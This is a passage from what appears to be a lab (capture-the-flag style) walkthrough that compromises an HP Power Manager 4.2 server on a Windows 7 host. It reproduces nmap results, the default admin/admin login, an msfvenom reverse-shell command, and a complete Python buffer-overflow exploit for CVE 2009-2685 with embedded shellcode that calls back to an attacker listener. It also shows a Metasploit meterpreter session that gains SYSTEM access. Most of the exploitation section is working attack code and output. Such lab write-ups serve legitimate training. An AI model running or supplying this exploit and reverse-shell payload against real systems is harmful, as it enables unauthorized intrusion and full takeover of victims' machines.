cpe:/o:microsoft:windows_10</span><br><span class="line">Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 R2 or Windows 8.1 (94%), Microsoft Windows 7 (94%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (94%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (94%), Microsoft Windows Vista SP2 (94%), Microsoft Windows Server 2008 (94%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (94%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 9h44m59s, deviation: 3h30m00s, median: 7h59m59s</span><br><span class="line">|_nbstat: NetBIOS name: KEVIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:8a:7d:41 (VMware)</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::-</span><br><span class="line">|   Computer name: kevin</span><br><span class="line">|   NetBIOS computer name: KEVIN\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2020-03-26T17:46:33-07:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2020-03-27T00:46:34</span><br><span class="line">|_  start_date: 2020-03-27T00:39:28</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 80/tcp)</span><br><span class="line">HOP RTT      ADDRESS</span><br><span class="line">1   33.45 ms 192.168.118.1</span><br><span class="line">2   28.82 ms 192.168.120.91</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 127.09 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a><strong>Web Enumeration</strong></h3><p>Navigating to the default web page on port 80, we are redirected to <code>/index.asp</code> and discover that it is an instance of HP Power Manager application:</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_1_KNxnfFuQ.PNG" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_1_KNxnfFuQ.PNG"></p>
<p>The publicly-listed credentials for this software are <code>admin / admin</code>.</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_2_LNvkxvKM.PNG" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_2_LNvkxvKM.PNG"></p>
<p>We can log in with those credentials and navigate to the <strong>Help</strong> page in the main menu to discover that this is <strong>version 4.2 (Build 7)</strong>:</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_3_ovgDCHII.PNG" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_3_ovgDCHII.PNG"></p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Shell-1-Universal-Buffer-Overflow"><a href="#Shell-1-Universal-Buffer-Overflow" class="headerlink" title="Shell #1: Universal Buffer Overflow"></a><strong>Shell #1: Universal Buffer Overflow</strong></h3><p>An exploit for this version is listed at <a href="https://www.exploit-db.com/exploits/10099">https://www.exploit-db.com/exploits/10099</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# searchsploit -t &quot;HP Power Manager&quot;</span><br><span class="line">------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                           |  Path</span><br><span class="line">                                                                         | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">HP Power Manager - &#x27;formExportDataLogs&#x27; Remote Buffer Overflow (Metasplo | exploits/cgi/remote/18015.rb</span><br><span class="line">Hewlett-Packard (HP) Power Manager Administration - Remote Buffer Overfl | exploits/windows/remote/16785.rb</span><br><span class="line">Hewlett-Packard (HP) Power Manager Administration Power Manager Administ | exploits/windows/remote/10099.py</span><br><span class="line">------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br><span class="line">root@kali:~#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We’ll need to change the shellcode to a reverse shell, keeping in mind the <code>n00bn00b</code> egg and the potentially bad characters. Let’s generate the shellcode:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e x86/alpha_mixed -f c -b &quot;\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a&quot; LHOST=192.168.118.3 LPORT=443</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/alpha_mixed</span><br><span class="line">x86/alpha_mixed succeeded with size 710 (iteration=0)</span><br><span class="line">x86/alpha_mixed chosen with final size 710</span><br><span class="line">Payload size: 710 bytes</span><br><span class="line">Final size of c file: 3008 bytes</span><br><span class="line">unsigned char buf[] =</span><br><span class="line">&quot;\x89\xe2\xd9\xc6\xd9\x72\xf4\x5f\x57\x59\x49\x49\x49\x49\x49&quot;</span><br><span class="line"></span><br><span class="line">*snip*</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Here’s our completed exploit code:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># HP Power Manager Administration Universal Buffer Overflow Exploit</span><br><span class="line"># CVE 2009-2685</span><br><span class="line"># Tested on Win2k3 Ent SP2 English, Win XP Sp2 English</span><br><span class="line"># Matteo Memelli ryujin __A-T__ offensive-security.com</span><br><span class="line"># www.offensive-security.com</span><br><span class="line"># Spaghetti &amp; Pwnsauce - 07/11/2009</span><br><span class="line">#</span><br><span class="line"># ryujin@bt:~$ ./hppowermanager.py 172.16.30.203</span><br><span class="line"># HP Power Manager Administration Universal Buffer Overflow Exploit</span><br><span class="line"># ryujin __A-T__ offensive-security.com</span><br><span class="line"># [+] Sending evil buffer...</span><br><span class="line"># HTTP/1.0 200 OK</span><br><span class="line"># [+] Done!</span><br><span class="line"># [*] Check your shell at 172.16.30.203:4444 , can take up to 1 min to spawn your shell</span><br><span class="line"># ryujin@bt:~$ nc -v 172.16.30.203 4444</span><br><span class="line"># 172.16.30.203: inverse host lookup failed: Unknown server error : Connection timed out</span><br><span class="line"># (UNKNOWN) [172.16.30.203] 4444 (?) open</span><br><span class="line"># Microsoft Windows [Version 5.2.3790]</span><br><span class="line"># (C) Copyright 1985-2003 Microsoft Corp.</span><br><span class="line"></span><br><span class="line"># C:\WINDOWS\system32&gt;</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from socket import *</span><br><span class="line"></span><br><span class="line">print &quot;HP Power Manager Administration Universal Buffer Overflow Exploit&quot;</span><br><span class="line">print &quot;ryujin __A-T__ offensive-security.com&quot;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">   HOST  = sys.argv[1]</span><br><span class="line">except IndexError:</span><br><span class="line">   print &quot;Usage: %s HOST&quot; % sys.argv[0]</span><br><span class="line">   sys.exit()</span><br><span class="line"></span><br><span class="line">PORT  = 80</span><br><span class="line">RET   = &quot;\xCF\xBC\x08\x76&quot; # 7608BCCF JMP ESP MSVCP60.dll</span><br><span class="line"></span><br><span class="line"># [*] Using Msf::Encoder::PexAlphaNum with final size of 709 bytes:</span><br><span class="line"># [*] msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e x86/alpha_mixed -f c -b &quot;\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a&quot; LHOST=192.168.118.3 LPORT=443</span><br><span class="line"># badchar = &quot;\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a&quot;</span><br><span class="line">SHELL = (</span><br><span class="line">&quot;n00bn00b&quot;</span><br><span class="line">&quot;\x89\xe6\xdb\xdd\xd9\x76\xf4\x5e\x56\x59\x49\x49\x49\x49\x49&quot;</span><br><span class="line">&quot;\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a&quot;</span><br><span class="line">&quot;\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32&quot;</span><br><span class="line">&quot;\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49&quot;</span><br><span class="line">&quot;\x59\x6c\x58\x68\x4f\x72\x55\x50\x77\x70\x75\x50\x31\x70\x4f&quot;</span><br><span class="line">&quot;\x79\x59\x75\x46\x51\x6f\x30\x33\x54\x4c\x4b\x50\x50\x46\x50&quot;</span><br><span class="line">&quot;\x6e\x6b\x56\x32\x64\x4c\x4e\x6b\x43\x62\x66\x74\x4c\x4b\x44&quot;</span><br><span class="line">&quot;\x32\x74\x68\x56\x6f\x48\x37\x43\x7a\x77\x56\x65\x61\x6b\x4f&quot;</span><br><span class="line">&quot;\x6e\x4c\x57\x4c\x73\x51\x53\x4c\x36\x62\x36\x4c\x65\x70\x5a&quot;</span><br><span class="line">&quot;\x61\x7a\x6f\x34\x4d\x33\x31\x6a\x67\x39\x72\x38\x72\x30\x52&quot;</span><br><span class="line">&quot;\x76\x37\x6c\x4b\x71\x42\x62\x30\x6e\x6b\x51\x5a\x35\x6c\x4e&quot;</span><br><span class="line">&quot;\x6b\x42\x6c\x62\x31\x43\x48\x7a\x43\x47\x38\x46\x61\x5a\x71&quot;</span><br><span class="line">&quot;\x36\x31\x4c\x4b\x30\x59\x65\x70\x37\x71\x58\x53\x6e\x6b\x72&quot;</span><br><span class="line">&quot;\x69\x62\x38\x58\x63\x36\x5a\x52\x69\x4e\x6b\x57\x44\x4e\x6b&quot;</span><br><span class="line">&quot;\x66\x61\x79\x46\x74\x71\x69\x6f\x4e\x4c\x4a\x61\x48\x4f\x74&quot;</span><br><span class="line">&quot;\x4d\x46\x61\x68\x47\x30\x38\x4b\x50\x44\x35\x58\x76\x43\x33&quot;</span><br><span class="line">&quot;\x71\x6d\x49\x68\x75\x6b\x31\x6d\x34\x64\x51\x65\x4a\x44\x30&quot;</span><br><span class="line">&quot;\x58\x6c\x4b\x31\x48\x34\x64\x63\x31\x38\x53\x42\x46\x6c\x4b&quot;</span><br><span class="line">&quot;\x44\x4c\x62\x6b\x6c\x4b\x52\x78\x67\x6c\x77\x71\x6b\x63\x6e&quot;</span><br><span class="line">&quot;\x6b\x53\x34\x4e\x6b\x43\x31\x78\x50\x6e\x69\x63\x74\x31\x34&quot;</span><br><span class="line">&quot;\x57\x54\x61\x4b\x31\x4b\x35\x31\x71\x49\x53\x6a\x43\x61\x6b&quot;</span><br><span class="line">&quot;\x4f\x4b\x50\x71\x4f\x53\x6f\x62\x7a\x6e\x6b\x67\x62\x58\x6b&quot;</span><br><span class="line">&quot;\x6e\x6d\x73\x6d\x63\x58\x65\x63\x55\x62\x75\x50\x47\x70\x63&quot;</span><br><span class="line">&quot;\x58\x31\x67\x74\x33\x70\x32\x51\x4f\x72\x74\x52\x48\x30\x4c&quot;</span><br><span class="line">&quot;\x33\x47\x55\x76\x56\x67\x69\x6f\x68\x55\x4f\x48\x6c\x50\x37&quot;</span><br><span class="line">&quot;\x71\x57\x70\x73\x30\x64\x69\x68\x44\x51\x44\x36\x30\x61\x78&quot;</span><br><span class="line">&quot;\x65\x79\x6b\x30\x42\x4b\x55\x50\x69\x6f\x59\x45\x52\x70\x52&quot;</span><br><span class="line">&quot;\x70\x32\x70\x50\x50\x73\x70\x72\x70\x67\x30\x46\x30\x31\x78&quot;</span><br><span class="line">&quot;\x59\x7a\x76\x6f\x4b\x6f\x59\x70\x39\x6f\x49\x45\x7a\x37\x31&quot;</span><br><span class="line">&quot;\x7a\x55\x55\x75\x38\x4b\x70\x4d\x78\x73\x46\x63\x33\x45\x38&quot;</span><br><span class="line">&quot;\x44\x42\x35\x50\x75\x51\x6f\x4b\x6b\x39\x4a\x46\x53\x5a\x54&quot;</span><br><span class="line">&quot;\x50\x30\x56\x76\x37\x31\x78\x6e\x79\x6c\x65\x54\x34\x53\x51&quot;</span><br><span class="line">&quot;\x49\x6f\x58\x55\x4c\x45\x59\x50\x54\x34\x64\x4c\x6b\x4f\x70&quot;</span><br><span class="line">&quot;\x4e\x36\x68\x34\x35\x38\x6c\x73\x58\x4c\x30\x6f\x45\x4c\x62&quot;</span><br><span class="line">&quot;\x76\x36\x4b\x4f\x38\x55\x73\x58\x31\x73\x50\x6d\x30\x64\x63&quot;</span><br><span class="line">&quot;\x30\x6f\x79\x39\x73\x53\x67\x76\x37\x76\x37\x35\x61\x6c\x36&quot;</span><br><span class="line">&quot;\x43\x5a\x74\x52\x51\x49\x52\x76\x78\x62\x79\x6d\x71\x76\x39&quot;</span><br><span class="line">&quot;\x57\x70\x44\x71\x34\x75\x6c\x67\x71\x67\x71\x4c\x4d\x31\x54&quot;</span><br><span class="line">&quot;\x34\x64\x46\x70\x6f\x36\x57\x70\x37\x34\x61\x44\x32\x70\x43&quot;</span><br><span class="line">&quot;\x66\x51\x46\x33\x66\x42\x66\x51\x46\x62\x6e\x31\x46\x76\x36&quot;</span><br><span class="line">&quot;\x50\x53\x76\x36\x42\x48\x54\x39\x7a\x6c\x65\x6f\x6c\x46\x49&quot;</span><br><span class="line">&quot;\x6f\x78\x55\x4d\x59\x6b\x50\x50\x4e\x30\x56\x61\x56\x79\x6f&quot;</span><br><span class="line">&quot;\x46\x50\x65\x38\x73\x38\x4b\x37\x37\x6d\x63\x50\x39\x6f\x69&quot;</span><br><span class="line">&quot;\x45\x6d\x6b\x38\x70\x6e\x55\x4c\x62\x33\x66\x72\x48\x69\x36&quot;</span><br><span class="line">&quot;\x4c\x55\x4f\x4d\x4d\x4d\x69\x6f\x68\x55\x65\x6c\x55\x56\x73&quot;</span><br><span class="line">&quot;\x4c\x76\x6a\x4d\x50\x49\x6b\x49\x70\x33\x45\x53\x35\x4f\x4b&quot;</span><br><span class="line">&quot;\x67\x37\x75\x43\x64\x32\x42\x4f\x71\x7a\x37\x70\x50\x53\x59&quot;</span><br><span class="line">&quot;\x6f\x4b\x65\x41\x41&quot;)</span><br><span class="line"></span><br><span class="line">EH =&#x27;\x33\xD2\x90\x90\x90\x42\x52\x6a&#x27;</span><br><span class="line">EH +=&#x27;\x02\x58\xcd\x2e\x3c\x05\x5a\x74&#x27;</span><br><span class="line">EH +=&#x27;\xf4\xb8\x6e\x30\x30\x62\x8b\xfa&#x27;</span><br><span class="line">EH +=&#x27;\xaf\x75\xea\xaf\x75\xe7\xff\xe7&#x27;</span><br><span class="line"></span><br><span class="line">evil =  &quot;POST http://%s/goform/formLogin HTTP/1.1\r\n&quot;</span><br><span class="line">evil += &quot;Host: %s\r\n&quot;</span><br><span class="line">evil += &quot;User-Agent: %s\r\n&quot;</span><br><span class="line">evil += &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;</span><br><span class="line">evil += &quot;Accept-Language: en-us,en;q=0.5\r\n&quot;</span><br><span class="line">evil += &quot;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n&quot;</span><br><span class="line">evil += &quot;Keep-Alive: 300\r\n&quot;</span><br><span class="line">evil += &quot;Proxy-Connection: keep-alive\r\n&quot;</span><br><span class="line">evil += &quot;Referer: http://%s/index.asp\r\n&quot;</span><br><span class="line">evil += &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span><br><span class="line">evil += &quot;Content-Length: 678\r\n\r\n&quot;</span><br><span class="line">evil += &quot;HtmlOnly=true&amp;Password=admin&amp;loginButton=Submit+Login&amp;Login=admin&quot;</span><br><span class="line">evil += &quot;\x41&quot;*256 + RET + &quot;\x90&quot;*32 + EH + &quot;\x42&quot;*287 + &quot;\x0d\x0a&quot;</span><br><span class="line">evil = evil % (HOST,HOST,SHELL,HOST)</span><br><span class="line"></span><br><span class="line">s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line">print &#x27;[+] Sending evil buffer...&#x27;</span><br><span class="line">s.send(evil)</span><br><span class="line">print s.recv(1024)</span><br><span class="line">print &quot;[+] Done!&quot;</span><br><span class="line">print &quot;[*] Check your shell at %s:4444 , can take up to 1 min to spawn your shell&quot; % HOST</span><br><span class="line">s.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Let’s set up a netcat listener on port 443 and launch the Python exploit against the target.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# python exploit.py 192.168.120.91</span><br><span class="line">HP Power Manager Administration Universal Buffer Overflow Exploit</span><br><span class="line">ryujin __A-T__ offensive-security.com</span><br><span class="line">[+] Sending evil buffer...</span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line"></span><br><span class="line">[+] Done!</span><br><span class="line">[*] Check your shell at 192.168.120.91:4444 , can take up to 1 min to spawn your shell</span><br><span class="line">root@kali:~#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>After a few seconds we should receive our reverse shell:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# nc -lvp 443</span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">192.168.120.91: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.118.3] from (UNKNOWN) [192.168.120.91] 49170</span><br><span class="line">Microsoft Windows [Version 6.1.7600]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Shell-2-Metasploit-Module-hp-power-manager-filename"><a href="#Shell-2-Metasploit-Module-hp-power-manager-filename" class="headerlink" title="Shell #2: Metasploit Module hp_power_manager_filename"></a><strong>Shell #2: Metasploit Module hp_power_manager_filename</strong></h3><p>We could also leverage a public Metasploit module against this vulnerability.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/http/hp_power_manager_filename</span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; set RHOST 192.168.120.91</span><br><span class="line">RHOST =&gt; 192.168.120.91</span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; set LHOST 192.168.118.3</span><br><span class="line">LHOST =&gt; 192.168.118.3</span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; set LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/http/hp_power_manager_filename):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS   192.168.120.91   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT    80               yes       The target port (TCP)</span><br><span class="line">   SSL      false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   VHOST                     no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.118.3    yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     443              yes       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows XP SP3 / Win Server 2003 SP0</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.118.3:443</span><br><span class="line">[*] Generating payload...</span><br><span class="line">[*] Trying target Windows XP SP3 / Win Server 2003 SP0...</span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.120.91</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.118.3:443 -&gt; 192.168.120.91:49167) at 2020-03-26 13:39:25 -0400</span><br><span class="line">[*] Payload sent! Go grab a coffee, the CPU is gonna work hard for you! :)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3620 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 6.1.7600]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>In some cases this module produces the following error:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.118.3:443</span><br><span class="line">[*] Generating payload...</span><br><span class="line">[*] Trying target Windows XP SP3 / Win Server 2003 SP0...</span><br><span class="line">[*] Payload sent! Go grab a coffee, the CPU is gonna work hard for you! :)</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>However, this is easily resolved by re-running the module.</p>
]]></content>
      <categories>
        <category>Windows Walkthrough</category>
      </categories>
      <tags>
        <tag>Exploit</tag>
        <tag>BOF</tag>
        <tag>Metasploit</tag>
      </tags>
  </entry>
</search>
